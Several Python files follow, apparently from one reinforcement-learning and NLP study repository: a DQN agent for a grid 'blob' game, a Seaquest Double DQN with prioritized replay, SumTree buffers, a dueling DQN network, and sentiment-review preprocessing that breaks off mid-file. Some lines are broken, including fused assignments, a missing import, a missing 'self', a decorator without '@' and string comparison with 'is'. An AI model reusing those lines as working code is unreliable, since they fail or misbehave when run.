    PLAYER_N = 1  # player key in dict
    FOOD_N = 2  # food key in dict
    ENEMY_N = 3  # enemy key in dict
    # the dict! (colors)
    d = {1: (255, 175, 0),
         2: (0, 255, 0),
         3: (0, 0, 255)}

    def __init__(self, n_enemies=7):
        self.n_enemies = n_enemies
        self.n_states = len(self.reset())

    def reset(self):
        self.enemies = []
        self.player = Blob(self.SIZE)
        self.food = Blob(self.SIZE)
        while self.food == self.player:
            self.food = Blob(self.SIZE)
        for i in range(self.n_enemies):
            enemy = Blob(self.SIZE)
            while enemy == self.player or enemy == self.food:
                enemy = Blob(self.SIZE)
            self.enemies.append(enemy)

        self.episode_step = 0

        if self.RETURN_IMAGES:
            observation = np.array(self.get_image())
        else:
            # all blob's coordinates
            observation = [self.player.x, self.player.y, self.food.x, self.food.y] + list(itertools.chain(*[[e.x, e.y] for e in self.enemies]))
        return observation

    def step(self, action):
        self.episode_step += 1
        self.player.action(action)

        #### MAYBE ###
        #enemy.move()
        #food.move()
        ##############

        if self.RETURN_IMAGES:
            new_observation = np.array(self.get_image())
        else:
            new_observation = [self.player.x, self.player.y, self.food.x, self.food.y] + list(itertools.chain(*[[e.x, e.y] for e in self.enemies]))

        # set the reward to move penalty by default
        reward = -self.MOVE_PENALTY

        if self.player == self.food:
            # if the player hits the food, good reward
            reward = self.FOOD_REWARD
        else:
            for enemy in self.enemies:
                if enemy == self.player:
                    # if the player hits one of the enemies, heavy punishment
                    reward = -self.ENEMY_PENALTY
                    break

        done = False
        if reward == self.FOOD_REWARD or reward == -self.ENEMY_PENALTY or self.episode_step >= 200:
            done = True
        return new_observation, reward, done

    def render(self):
        img = self.get_image()
        img = img.resize((300, 300))  # resizing so we can see our agent in all its glory.
        cv2.imshow("image", np.array(img))  # show it!
        cv2.waitKey(1)

    # FOR CNN #
    def get_image(self):
        env = np.zeros((self.SIZE, self.SIZE, 3), dtype=np.uint8)  # starts an rbg of our size
        env[self.food.x][self.food.y] = self.d[self.FOOD_N]  # sets the food location tile to green color
        for enemy in self.enemies:
            env[enemy.x][enemy.y] = self.d[ENEMY_N]  # sets the enemy location to red
        env[self.player.x][self.player.y] = self.d[self.PLAYER_N]  # sets the player tile to blue
        img = Image.fromarray(env, 'RGB')  # reading to rgb. Apparently. Even tho color definitions are bgr. ???
        return img


env = BlobEnv()

# For stats
ep_rewards = [-200]

# For more repetitive results
random.seed(1)
np.random.seed(1)
tf.set_random_seed(1)

# Memory fraction, used mostly when trai8ning multiple agents
#gpu_options = tf.GPUOptions(per_process_gpu_memory_fraction=MEMORY_FRACTION)
#backend.set_session(tf.Session(config=tf.ConfigProto(gpu_options=gpu_options)))

# Create models folder
if not os.path.isdir('models'):
    os.makedirs('models')


# Own Tensorboard class
class ModifiedTensorBoard(TensorBoard):

    # Overriding init to set initial step and writer (we want one log file for all .fit() calls)
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.step = 1
        self.writer = tf.summary.FileWriter(self.log_dir)

    # Overriding this method to stop creating default log writer
    def set_model(self, model):
        pass

    # Overrided, saves logs with our step number
    # (otherwise every .fit() will start writing from 0th step)
    def on_epoch_end(self, epoch, logs=None):
        self.update_stats(**logs)

    # Overrided
    # We train for one batch only, no need to save anything at epoch end
    def on_batch_end(self, batch, logs=None):
        pass

    # Overrided, so won't close writer
    def on_train_end(self, _):
        pass

    # Custom method for saving own metrics
    # Creates writer, writes custom metrics and closes writer
    def update_stats(self, **stats):
        self._write_logs(stats, self.step)


# Agent class
class DQNAgent:
    def __init__(self, state_in_image=True):

        self.state_in_image = state_in_image

        # Main model
        self.model = self.create_model()

        # Target network
        self.target_model = self.create_model()
        self.target_model.set_weights(self.model.get_weights())

        # An array with last n steps for training
        self.replay_memory = deque(maxlen=REPLAY_MEMORY_SIZE)

        # Custom tensorboard object
        self.tensorboard = ModifiedTensorBoard(log_dir="logs/{}-{}".format(MODEL_NAME, int(time.time())))

        # Used to count when to update target network with main network's weights
        self.target_update_counter = 0

    def create_model(self):
        # get the NN input length
        model = Sequential()
        if self.state_in_image:
            model.add(Conv2D(256, (3, 3), input_shape=env.OBSERVATION_SPACE_VALUES))  # OBSERVATION_SPACE_VALUES = (10, 10, 3) a 10x10 RGB image.
            model.add(Activation('relu'))
            model.add(MaxPooling2D(pool_size=(2, 2)))
            model.add(Dropout(0.2))

            model.add(Conv2D(256, (3, 3)))
            model.add(Activation('relu'))
            model.add(MaxPooling2D(pool_size=(2, 2)))
            model.add(Dropout(0.2))

            model.add(Flatten())  # this converts our 3D feature maps to 1D feature vectors
            model.add(Dense(32))
        else:
            # model.add(Dense(32, activation="relu", input_shape=(env.n_states,)))
            # model.add(Dense(32, activation="relu"))
            # model.add(Dropout(0.2))
            # model.add(Dense(32, activation="relu"))
            # model.add(Dropout(0.2))
            model.add(LSTM(128, activation="relu", input_shape=(None, env.n_states,), return_sequences=True))
            model.add(Dropout(0.3))
            model.add(LSTM(128, activation="relu", return_sequences=True))
            model.add(Dropout(0.3))
            model.add(LSTM(128, activation="relu", return_sequences=False))
            model.add(Dropout(0.3))

        model.add(Dense(env.ACTION_SPACE_SIZE, activation='linear'))  # ACTION_SPACE_SIZE = how many choices (9)
        model.compile(loss="mse", optimizer=Adam(lr=0.001), metrics=['accuracy'])
        return model

    # Adds step's data to a memory replay array
    # (observation space, action, reward, new observation space, done)
    def update_replay_memory(self, transition):
        self.replay_memory.append(transition)

    # Trains main network every step during episode
    def train(self, terminal_state, step):

        # Start training only if certain number of samples is already saved
        if len(self.replay_memory) < MIN_REPLAY_MEMORY_SIZE:
            return

        # Get a minibatch of random samples from memory replay table
        minibatch = random.sample(self.replay_memory, MINIBATCH_SIZE)

        # Get current states from minibatch, then query NN model for Q values
        if self.state_in_image:
            current_states = np.array([transition[0] for transition in minibatch])/255
        else:
            current_states = np.array([transition[0] for transition in minibatch])
        current_qs_list = self.model.predict(np.expand_dims(current_states, axis=1))

        # Get future states from minibatch, then query NN model for Q values
        # When using target network, query it, otherwise main network should be queried
        if self.state_in_image:
            new_current_states = np.array([transition[3] for transition in minibatch])/255
        else:
            new_current_states = np.array([transition[3] for transition in minibatch])
        future_qs_list = self.target_model.predict(np.expand_dims(new_current_states, axis=1))

        X = []
        y = []

        # Now we need to enumerate our batches
        for index, (current_state, action, reward, new_current_state, done) in enumerate(minibatch):

            # If not a terminal state, get new q from future states, otherwise set it to 0
            # almost like with Q Learning, but we use just part of equation here
            if not done:
                max_future_q = np.max(future_qs_list[index])
                new_q = reward + DISCOUNT * max_future_q
            else:
                new_q = reward

            # Update Q value for given state
            current_qs = current_qs_list[index]
            current_qs[action] = new_q

            # And append to our training data
            X.append(current_state)
            y.append(current_qs)

        # Fit on all samples as one batch, log only on terminal state
        if self.state_in_image:
            self.model.fit(np.array(X)/255, np.array(y), batch_size=MINIBATCH_SIZE, verbose=0, shuffle=False, callbacks=[self.tensorboard] if terminal_state else None)
        else:
            # self.model.fit(np.array(X), np.array(y), batch_size=MINIBATCH_SIZE, verbose=0, shuffle=False, callbacks=[self.tensorboard] if terminal_state else None)
            self.model.fit(np.expand_dims(X, axis=1), np.array(y), batch_size=MINIBATCH_SIZE, verbose=0, shuffle=False, callbacks=[self.tensorboard] if terminal_state else None)


        # Update target network counter every episode
        if terminal_state:
            self.target_update_counter += 1

        # If counter reaches set value, update target network with weights of main network
        if self.target_update_counter > UPDATE_TARGET_EVERY:
            self.target_model.set_weights(self.model.get_weights())
            self.target_update_counter = 0

    # Queries main network for Q values given current observation space (environment state)
    def get_qs(self, state):
        if self.state_in_image:
            return self.model.predict(np.array(state).reshape(-1, *state.shape)/255)[0]
        else:
            # return self.model.predict(np.array(state).reshape(1, env.n_states))[0]
            return self.model.predict(np.array(state).reshape(1, 1, env.n_states))[0]


agent = DQNAgent(state_in_image=False)
print("Number of states:", env.n_states)
# agent.model.load_weights("models/2x32____22.00max___-2.44avg_-200.00min__1563463022.model")
# Iterate over episodes
for episode in tqdm(range(1, EPISODES + 1), ascii=True, unit='episodes'):

    # Update tensorboard step every episode
    agent.tensorboard.step = episode

    # Restarting episode - reset episode reward and step number
    episode_reward = 0
    step = 1

    # Reset environment and get initial state
    current_state = env.reset()

    # Reset flag and start iterating until episode ends
    done = False
    while not done:

        # This part stays mostly the same, the change is to query a model for Q values
        if np.random.random() > epsilon:
            # Get action from Q table
            action = np.argmax(agent.get_qs(current_state))
        else:
            # Get random action
            action = np.random.randint(0, env.ACTION_SPACE_SIZE)

        new_state, reward, done = env.step(action)

        # Transform new continous state to new discrete state and count reward
        episode_reward += reward

        if SHOW_PREVIEW and not episode % AGGREGATE_STATS_EVERY:
            env.render()

        # Every step we update replay memory and train main network
        agent.update_replay_memory((current_state, action, reward, new_state, done))
        agent.train(done, step)

        current_state = new_state
        step += 1

    # Append episode reward to a list and log stats (every given number of episodes)
    ep_rewards.append(episode_reward)
    if not episode % AGGREGATE_STATS_EVERY or episode == 1:
        average_reward = sum(ep_rewards[-AGGREGATE_STATS_EVERY:])/len(ep_rewards[-AGGREGATE_STATS_EVERY:])
        min_reward = min(ep_rewards[-AGGREGATE_STATS_EVERY:])
        max_reward = max(ep_rewards[-AGGREGATE_STATS_EVERY:])
        agent.tensorboard.update_stats(reward_avg=average_reward, reward_min=min_reward, reward_max=max_reward, epsilon=epsilon)

        # Save model, but only when min reward is greater or equal a set value
        if average_reward >= -220:
            agent.model.save(f'models/{MODEL_NAME}__{max_reward:_>7.2f}max_{average_reward:_>7.2f}avg_{min_reward:_>7.2f}min__{int(time.time())}.model')

    # Decay epsilon
    if epsilon > MIN_EPSILON:
        epsilon *= EPSILON_DECAY
        epsilon = max(MIN_EPSILON, epsilon)
    
agent.model.save(f'models/{MODEL_NAME}__{max_reward:_>7.2f}max_{average_reward:_>7.2f}avg_{min_reward:_>7.2f}min__{int(time.time())}.model')




# OpenGym Seaquest-v0
# -------------------
#
# This code demonstrates a Double DQN network with Priority Experience Replay
# in an OpenGym Seaquest-v0 environment.
#
# Made as part of blog series Let's make a DQN, available at: 
# https://jaromiru.com/2016/11/07/lets-make-a-dqn-double-learning-and-prioritized-experience-replay/
# 
# author: Jaromir Janisch, 2016

import matplotlib
import random, numpy, math, gym, scipy
import tensorflow as tf
import time
from SumTree import SumTree
from keras.callbacks import TensorBoard
from collections import deque
import tqdm

IMAGE_WIDTH = 84
IMAGE_HEIGHT = 84
IMAGE_STACK = 2

HUBER_LOSS_DELTA = 2.0
LEARNING_RATE = 0.00045


#-------------------- Modified Tensorboard -----------------------
class RLTensorBoard(TensorBoard):

    def __init__(self, **kwargs):
        """
        Overriding init to set initial step and writer (one log file for multiple .fit() calls)
        """
        super().__init__(**kwargs)
        self.step = 1
        self.writer = tf.summary.FileWriter(self.log_dir)

    def set_model(self, model):
        """
        Overriding this method to stop creating default log writer
        """
        pass

    def on_epoch_end(self, epoch, logs=None):
        """
        Overrided, saves logs with our step number
        (if this is not overrided, every .fit() call will start from 0th step)
        """
        self.update_stats(**logs)

    def on_batch_end(self, batch, logs=None):
        """
        Overrided, we train for one batch only, no need to save anything on batch end
        """
        pass

    def on_train_end(self, _):
        """
        Overrided, we don't close the writer
        """
        pass

    def update_stats(self, **stats):
        """
        Custom method for saving own metrics
        Creates writer, writes custom metrics and closes writer
        """
        self._write_logs(stats, self.step)

#-------------------- UTILITIES -----------------------
def huber_loss(y_true, y_pred):
    err = y_true - y_pred

    cond = K.abs(err) < HUBER_LOSS_DELTA
    L2 = 0.5 * K.square(err)
    L1 = HUBER_LOSS_DELTA * (K.abs(err) - 0.5 * HUBER_LOSS_DELTA)

    loss = tf.where(cond, L2, L1)   # Keras does not cover where function in tensorflow :-(

    return K.mean(loss)

def processImage( img ):
    rgb = scipy.misc.imresize(img, (IMAGE_WIDTH, IMAGE_HEIGHT), interp='bilinear')

    r, g, b = rgb[:,:,0], rgb[:,:,1], rgb[:,:,2]
    gray = 0.2989 * r + 0.5870 * g + 0.1140 * b     # extract luminance

    o = gray.astype('float32') / 128 - 1    # normalize
    return o

#-------------------- BRAIN ---------------------------
from keras.models import Sequential
from keras.layers import *
from keras.optimizers import *

model_name = "conv2dx3"

class Brain:
    def __init__(self, stateCnt, actionCnt):
        self.stateCnt = stateCnt
        self.actionCnt = actionCnt

        self.model = self._createModel()
        self.model_ = self._createModel()  # target network
        # custom tensorboard
        self.tensorboard = RLTensorBoard(log_dir="logs/{}-{}".format(model_name, int(time.time())))

    def _createModel(self):
        model = Sequential()

        model.add(Conv2D(32, (8, 8), strides=(4,4), activation='relu', input_shape=(self.stateCnt), data_format='channels_first'))
        model.add(Conv2D(64, (4, 4), strides=(2,2), activation='relu'))
        model.add(Conv2D(64, (3, 3), activation='relu'))
        model.add(Flatten())
        model.add(Dense(units=512, activation='relu'))

        model.add(Dense(units=actionCnt, activation='linear'))

        opt = RMSprop(lr=LEARNING_RATE)
        model.compile(loss=huber_loss, optimizer=opt)

        return model

    def train(self, x, y, epochs=1, verbose=0):
        self.model.fit(x, y, batch_size=32, epochs=epochs, verbose=verbose, callbacks=[self.tensorboard])

    def predict(self, s, target=False):
        if target:
            return self.model_.predict(s)
        else:
            return self.model.predict(s)

    def predictOne(self, s, target=False):
        return self.predict(s.reshape(1, IMAGE_STACK, IMAGE_WIDTH, IMAGE_HEIGHT), target).flatten()

    def updateTargetModel(self):
        self.model_.set_weights(self.model.get_weights())

#-------------------- MEMORY --------------------------
class Memory:   # stored as ( s, a, r, s_ ) in SumTree
    e = 0.01
    a = 0.6

    def __init__(self, capacity):
        self.tree = SumTree(capacity)

    def _getPriority(self, error):
        return (error + self.e) ** self.a

    def add(self, error, sample):
        p = self._getPriority(error)
        self.tree.add(p, sample) 

    def sample(self, n):
        batch = []
        segment = self.tree.total() / n

        for i in range(n):
            a = segment * i
            b = segment * (i + 1)

            s = random.uniform(a, b)
            (idx, p, data) = self.tree.get(s)
            batch.append( (idx, data) )

        return batch

    def update(self, idx, error):
        p = self._getPriority(error)
        self.tree.update(idx, p)

#-------------------- AGENT ---------------------------
MEMORY_CAPACITY = 50_000

BATCH_SIZE = 32

GAMMA = 0.95

MAX_EPSILON = 1
MIN_EPSILON = 0.05

EXPLORATION_STOP = 500_000   # at this step epsilon will be 0.01
LAMBDA = - math.log(0.01) / EXPLORATION_STOP  # speed of decay

UPDATE_TARGET_FREQUENCY = 10_000
UPDATE_STATS_EVERY = 5
RENDER_EVERY = 50

class Agent:
    steps = 0
    epsilon = MAX_EPSILON

    def __init__(self, stateCnt, actionCnt, brain):
        self.stateCnt = stateCnt
        self.actionCnt = actionCnt

        self.brain = brain
        # self.memory = Memory(MEMORY_CAPACITY)
        
    def act(self, s):
        if random.random() < self.epsilon:
            return random.randint(0, self.actionCnt-1)
        else:
            return numpy.argmax(self.brain.predictOne(s))

    def observe(self, sample):  # in (s, a, r, s_) format
        x, y, errors = self._getTargets([(0, sample)])
        self.memory.add(errors[0], sample)

        if self.steps % UPDATE_TARGET_FREQUENCY == 0:
            self.brain.updateTargetModel()

        # slowly decrease Epsilon based on our eperience
        self.steps += 1
        self.epsilon = MIN_EPSILON + (MAX_EPSILON - MIN_EPSILON) * math.exp(-LAMBDA * self.steps)

    def _getTargets(self, batch):
        no_state = numpy.zeros(self.stateCnt)

        states = numpy.array([ o[1][0] for o in batch ])
        states_ = numpy.array([ (no_state if o[1][3] is None else o[1][3]) for o in batch ])

        p = agent.brain.predict(states)

        p_ = agent.brain.predict(states_, target=False)
        pTarget_ = agent.brain.predict(states_, target=True)

        x = numpy.zeros((len(batch), IMAGE_STACK, IMAGE_WIDTH, IMAGE_HEIGHT))
        y = numpy.zeros((len(batch), self.actionCnt))
        errors = numpy.zeros(len(batch))
        
        for i in range(len(batch)):
            o = batch[i][1]
            s = o[0] a = o[1] r = o[2] s_ = o[3]
            
            t = p[i]
            oldVal = t[a]
            if s_ is None:
                t[a] = r
            else:
                t[a] = r + GAMMA * pTarget_[i][ numpy.argmax(p_[i]) ]  # double DQN

            x[i] = s
            y[i] = t
            errors[i] = abs(oldVal - t[a])

        return (x, y, errors)

    def replay(self):    
        batch = self.memory.sample(BATCH_SIZE)
        x, y, errors = self._getTargets(batch)

        # update errors
        for i in range(len(batch)):
            idx = batch[i][0]
            self.memory.update(idx, errors[i])

        self.brain.train(x, y)

class RandomAgent:
    memory = Memory(MEMORY_CAPACITY)
    exp = 0
    epsilon = MAX_EPSILON

    def __init__(self, actionCnt, brain):
        self.actionCnt = actionCnt
        self.brain = brain

    def act(self, s):
        return random.randint(0, self.actionCnt-1)

    def observe(self, sample):  # in (s, a, r, s_) format
        error = abs(sample[2])  # reward
        self.memory.add(error, sample)
        self.exp += 1

    def replay(self):
        pass

#-------------------- ENVIRONMENT ---------------------
class Environment:
    def __init__(self, problem):
        self.problem = problem
        self.env = gym.make(problem)
        self.ep_rewards = deque(maxlen=UPDATE_STATS_EVERY)

    def run(self, agent, step):                
        img = self.env.reset()
        w = processImage(img)
        s = numpy.array([w, w])
        agent.brain.tensorboard.step = step
        R = 0
        while True:
            if step % RENDER_EVERY == 0:
                self.env.render()
            a = agent.act(s)

            img, r, done, info = self.env.step(a)
            s_ = numpy.array([s[1], processImage(img)]) #last two screens

            r = np.clip(r, -1, 1)   # clip reward to [-1, 1]

            if done: # terminal state
                s_ = None

            agent.observe( (s, a, r, s_) )
            agent.replay()            

            s = s_
            R += r

            if done:
                break

        
        self.ep_rewards.append(R)
        avg_reward = sum(self.ep_rewards) / len(self.ep_rewards)
        if step % UPDATE_STATS_EVERY == 0:
            min_reward = min(self.ep_rewards)
            max_reward = max(self.ep_rewards)
            agent.brain.tensorboard.update_stats(reward_avg=avg_reward, reward_min=min_reward, reward_max=max_reward, epsilon=agent.epsilon)
            agent.brain.model.save(f"models/{model_name}-avg-{avg_reward:.2f}-min-{min_reward:.2f}-max-{max_reward:2f}.h5")
        # print("Total reward:", R)
        return avg_reward

#-------------------- MAIN ----------------------------
PROBLEM = 'Seaquest-v0'
env = Environment(PROBLEM)

episodes = 2_000

stateCnt  = (IMAGE_STACK, IMAGE_WIDTH, IMAGE_HEIGHT)
actionCnt = env.env.action_space.n

brain = Brain(stateCnt, actionCnt)

agent = Agent(stateCnt, actionCnt, brain)
randomAgent = RandomAgent(actionCnt, brain)

step = 0
try:
    print("Initialization with random agent...")
    while randomAgent.exp < MEMORY_CAPACITY:
        step += 1
        env.run(randomAgent, step)
        print(randomAgent.exp, "/", MEMORY_CAPACITY)

    agent.memory = randomAgent.memory

    randomAgent = None

    print("Starting learning")
    for i in tqdm.tqdm(list(range(step+1, episodes+step+1))):
        env.run(agent, i)
finally:
    agent.brain.model.save("Seaquest-DQN-PER.h5")




import numpy as np

class SumTree:
    """
    This SumTree code is modified version of Morvan Zhou: 
    https://github.com/MorvanZhou/Reinforcement-learning-with-tensorflow/blob/master/contents/5.2_Prioritized_Replay_DQN/RL_brain.py
    """
    data_pointer = 0
    def __init__(self, length):
        # number of leaf nodes (final nodes that contains experiences)
        self.length = length

        # generate the tree with all nodes' value = 0
        # binary node (each node has max 2 children) so 2x size of leaf capacity - 1
        # parent nodes = length - 1
        # leaf nodes = length
        self.tree = np.zeros(2*self.length - 1)
        # contains the experiences
        self.data = np.zeros(self.length, dtype=object)

    def add(self, priority, data):
        """
        Add priority score in the sumtree leaf and add the experience in data
        """
        # look at what index we want to put the experience
        tree_index = self.data_pointer + self.length - 1
        
        #tree:
        #           0
        #           / \
        #          0   0
        #         / \ / \
       #tree_index  0 0  0  We fill the leaves from left to right

        self.data[self.data_pointer] = data

        # update the leaf
        self.update(tree_index, priority)

        # increment data pointer
        self.data_pointer += 1

        # if we're above the capacity, we go back to the first index
        if self.data_pointer >= self.length:
            self.data_pointer = 0


    def update(self, tree_index, priority):
        """
        Update the leaf priority score and propagate the change through the tree
        """

        # change = new priority score - former priority score
        change = priority - self.tree[tree_index]
        self.tree[tree_index] = priority

        while tree_index != 0:    # this method is faster than the recursive loop in the reference code
            
            """
            Here we want to access the line above
            THE NUMBERS IN THIS TREE ARE THE INDEXES NOT THE PRIORITY VALUES
            
                0
               / \
              1   2
             / \ / \
            3  4 5  [6] 
            
            If we are in leaf at index 6, we updated the priority score
            We need then to update index 2 node
            So tree_index = (tree_index - 1) // 2
            tree_index = (6-1)//2
            tree_index = 2 (because // round the result)
            """
            tree_index = (tree_index - 1) // 2
            self.tree[tree_index] += change

        
    """
    Here we get the leaf_index, priority value of that leaf and experience associated with that index
    """
    def get_leaf(self, v):
        """
        Tree structure and array storage:
        Tree index:
             0         -> storing priority sum
            / \
          1     2
         / \   / \
        3   4 5   6    -> storing priority for experiences
        Array type for storing:
        [0,1,2,3,4,5,6]
        """
        parent_index = 0
        
        while True: # the while loop is faster than the method in the reference code
            left_child_index = 2 * parent_index + 1
            right_child_index = left_child_index + 1
            
            # If we reach bottom, end the search
            if left_child_index >= len(self.tree):
                leaf_index = parent_index
                break
            
            else: # downward search, always search for a higher priority node
                
                if v <= self.tree[left_child_index]:
                    parent_index = left_child_index
                    
                else:
                    v -= self.tree[left_child_index]
                    parent_index = right_child_index
            
        data_index = leaf_index - self.length + 1

        return leaf_index, self.tree[leaf_index], self.data[data_index]
    
    property
    def total_priority(self):
        return self.tree[0] # Returns the root node



class Memory:
    # we use this to avoid some experiences to have 0 probability of getting picked
    PER_e = 0.01
    # we use this to make a tradeoff between taking only experiences with high priority
    # and sampling randomly
    PER_a = 0.6
    # we use this for importance sampling, from this to 1 through the training
    PER_b = 0.4

    PER_b_increment_per_sample = 0.001

    absolute_error_upper = 1.0

    def __init__(self, capacity):
        # the tree is composed of a sum tree that contains the priority scores and his leaf
        # and also a data list
        # we don't use deque here because it means that at each timestep our experiences change index by one
        # we prefer to use a simple array to override when the memory is full
        self.tree = SumTree(length=capacity)

    def store(self, experience):
        """
        Store a new experience in our tree
        Each new experience have a score of max_priority (it'll be then improved)
        """
        # find the max priority
        max_priority = np.max(self.tree.tree[-self.tree.length:])

        # if the max priority = 0 we cant put priority = 0 since this exp will never have a chance to be picked
        # so we use a minimum priority
        if max_priority == 0:
            max_priority = self.absolute_error_upper
        
        # set the max p for new p
        self.tree.add(max_priority, experience)

    def sample(self, n):
        """
        - First, to sample a minimatch of k size, the range [0, priority_total] is / into k ranges.
        - then a value is uniformly sampled from each range
        - we search in the sumtree, the experience where priority score correspond to sample values are 
        retrieved from.
        - then, we calculate IS weights for each minibatch element 
        """
        # create a sample list that will contains the minibatch
        memory = []

        b_idx, b_is_weights = np.zeros((n, ), dtype=np.int32), np.zeros((n, 1), dtype=np.float32)

        # calculate the priority segment
        # here, as explained in the paper, we divide the range [0, ptotal] into n ranges
        priority_segment = self.tree.total_priority / n

        # increase b each time 
        self.PER_b = np.min([1., self.PER_b + self.PER_b_increment_per_sample])

        # calculating the max weight
        p_min = np.min(self.tree.tree[-self.tree.length:]) / self.tree.total_priority
        max_weight = (p_min * n) ** (-self.PER_b)

        for i in range(n):
            a, b = priority_segment * i, priority_segment * (i + 1)
            value = np.random.uniform(a, b)

            # experience that correspond to each value is retrieved
            index, priority, data = self.tree.get_leaf(value)

            # P(j)
            sampling_probs = priority / self.tree.total_priority

            # IS = (1/N * 1/P(i))**b /max wi == (N*P(i))**-b  /max wi
            b_is_weights[i, 0] = np.power(n * sampling_probs, -self.PER_b)/ max_weight

            b_idx[i]= index

            experience = [data]

            memory.append(experience)

        return b_idx, memory, b_is_weights

    

    def batch_update(self, tree_idx, abs_errors):
        """
        Update the priorities on the tree
        """
        abs_errors += self.PER_e
        clipped_errors = np.min([abs_errors, self.absolute_error_upper])
        ps = np.power(clipped_errors, self.PER_a)

        for ti, p in zip(tree_idx, ps):
            self.tree.update(ti, p)




import tensorflow as tf

class DDDQNNet:
    """ Dueling Double Deep Q Neural Network """
    def __init__(self, state_size, action_size, learning_rate, name):
        self.state_size = state_size
        self.action_size = action_size
        self.learning_rate = learning_rate
        self.name = name

        # we use tf.variable_scope to know which network we're using (DQN or the Target net)
        # it'll be helpful when we will update our w- parameters (by copy the DQN parameters)
        with tf.variable_scope(self.name):
            # we create the placeholders
            self.inputs_ = tf.placeholder(tf.float32, [None, *state_size], name="inputs")

            self.is_weights_ = tf.placeholder(tf.float32, [None, 1], name="is_weights")

            self.actions_ = tf.placeholder(tf.float32, [None, self.action_size], name="actions_")

            # target Q
            self.target_q = tf.placeholder(tf.float32, [None], name="target")

            # neural net
            self.dense1 = tf.layers.dense(inputs=self.inputs_,
                                          units=32,
                                          name="dense1",
                                          kernel_initializer=tf.contrib.layers.xavier_initializer(),
                                          activation="relu")
            
            self.dense2 = tf.layers.dense(inputs=self.dense1,
                                          units=32,
                                          name="dense2",
                                          kernel_initializer=tf.contrib.layers.xavier_initializer(),
                                          activation="relu")

            self.dense3 = tf.layers.dense(inputs=self.dense2,
                                          units=32,
                                          name="dense3",
                                          kernel_initializer=tf.contrib.layers.xavier_initializer())

            # here we separate into two streams (dueling)
            # this one is State-Function V(s)
            self.value = tf.layers.dense(inputs=self.dense3,
                                         units=1,
                                         kernel_initializer=tf.contrib.layers.xavier_initializer(),
                                         activation=None,
                                         name="value"
                                         )

            # and this one is Value-Function A(s, a)
            self.advantage = tf.layers.dense(inputs=self.dense3,
                                             units=self.action_size,
                                             activation=None,
                                             kernel_initializer=tf.contrib.layers.xavier_initializer(),
                                             name="advantage"
                                             )

            # aggregation
            # Q(s, a) = V(s) + ( A(s, a) - 1/|A| * sum A(s, a') )

            self.output = self.value + tf.subtract(self.advantage, tf.reduce_mean(self.advantage, axis=1, keepdims=True))

            # Q is our predicted Q value
            self.Q = tf.reduce_sum(tf.multiply(self.output, self.actions_))

            self.absolute_errors = tf.abs(self.target_q - self.Q)

            # w- * (target_q - q)**2
            self.loss = tf.reduce_mean(self.is_weights_ * tf.squared_difference(self.target_q, self.Q))


            self.optimizer = tf.train.RMSPropOptimizer(self.learning_rate).minimize(self.loss)




import numpy

class SumTree:
    write = 0

    def __init__(self, capacity):
        self.capacity = capacity
        self.tree = numpy.zeros( 2*capacity - 1 )
        self.data = numpy.zeros( capacity, dtype=object )

    def _propagate(self, idx, change):
        parent = (idx - 1) // 2

        self.tree[parent] += change

        if parent != 0:
            self._propagate(parent, change)

    def _retrieve(self, idx, s):
        left = 2 * idx + 1
        right = left + 1

        if left >= len(self.tree):
            return idx

        if s <= self.tree[left]:
            return self._retrieve(left, s)
        else:
            return self._retrieve(right, s-self.tree[left])

    def total(self):
        return self.tree[0]

    def add(self, p, data):
        idx = self.write + self.capacity - 1

        self.data[self.write] = data
        self.update(idx, p)

        self.write += 1
        if self.write >= self.capacity:
            self.write = 0

    def update(self, idx, p):
        change = p - self.tree[idx]

        self.tree[idx] = p
        self._propagate(idx, change)

    def get(self, s):
        idx = self._retrieve(0, s)
        dataIdx = idx - self.capacity + 1

        return (idx, self.tree[idx], self.data[dataIdx])




import numpy as np

from string import punctuation
from collections import Counter
from sklearn.model_selection import train_test_split


with open("data/reviews.txt") as f:
    reviews = f.read()

with open("data/labels.txt") as f:
    labels = f.read()

# remove all punctuations
all_text = ''.join([ c for c in reviews if c not in punctuation ])

reviews = all_text.split("\n")
reviews = [ review.strip() for review in reviews ]
all_text = ' '.join(reviews)
words = all_text.split()
print("Total words:", len(words))

# encoding the words

# dictionary that maps vocab words to integers here
vocab = sorted(set(words))
print("Unique words:", len(vocab))
# start is 1 because 0 is encoded for blank
vocab2int = {word: i for i, word in enumerate(vocab, start=1)}

# encoded reviews
encoded_reviews = []
for review in reviews:
    encoded_reviews.append([vocab2int[word] for word in review.split()])

encoded_reviews = np.array(encoded_reviews)
# print("Number of reviews:", len(encoded_reviews))

# encode the labels, 1 for 'positive' and 0 for 'negative'
labels = labels.split("\n")
labels = [1 if label is 'positive' else 0 for label in labels]
# print("Number of labels:", len(labels))

review_lens = [len(x) for x in encoded_reviews]
counter_reviews_lens = Counter(review_lens)

# remove any reviews with 0 length
cleaned_encoded_reviews, cleaned_labels = [], []
for review, label in zip(encoded_reviews, labels):
    if len(review) != 0:
        cleaned_encoded_reviews.append(review)
        cleaned_labels.append(label)

encoded_reviews = np.array(cleaned_encoded_reviews)
labels = cleaned_labels
# print("Number of reviews:", len(encoded_reviews))
# print("Number of labels:", len(labels))

sequence_length = 200
features = np.zeros((len(encoded_reviews), sequence_length), dtype=int)
for i, review in enumerate(encoded_reviews):
    features[i, -len(review):] = review[:sequence_length]

# print(features[:10, :100])

# split data into train, validation and test
split_frac = 0.9

X_train, X_test, y_train, y_test = train_test_split(features, labels, test_size=1-split_frac)
X_test, X_validation, y_test, y_validation = train_test_split(X_test, y_test, test_size=0.5)

print(f"""Features shapes:
Train set:      {X_train.shape}
Validation set: {X_validation.shape}
Test set:       {X_test.shape}""")
print("Example:")
print(X_train[0])
print(y_train[0])

# X_train, X_validation = features[:split_frac*len(features)], features[split_frac*len(features):]
# y_train, y_validation = labels[:split]




import tensorflow as tf
from utils import get_batches
from train import *




import tensorflow as tf
from preprocess import vocab2int, X_train, y_train, X_validation, y_validation, X_test, y_test
from utils import get_batches

import numpy as np

def get_lstm_cell():
    # basic LSTM cell
    lstm = tf.contrib.rnn.BasicLSTMCell(lstm_size)

    # dropout to the cell
    drop = tf.contrib.rnn.DropoutWrapper(lstm, output_keep_prob=keep_prob)

    return drop

# RNN paramaters
lstm_size = 256
lstm_layers = 1
batch_size = 256
learning_rate = 0.001

n_words = len(vocab2int) + 1 # Added 1 for the 0 that is for padding

# create the graph object
graph = tf.Graph()
# add nodes to the graph
with graph.as_default():
    inputs = tf.placeholder(tf.int32, (None, None), "inputs")
    labels = tf.placeholder(tf.int32, (None, None), "labels")
    keep_prob = tf.placeholder(tf.float32, name="keep_prob")

# number of units in the embedding layer
embedding_size = 300

with graph.as_default():
    # embedding lookup matrix
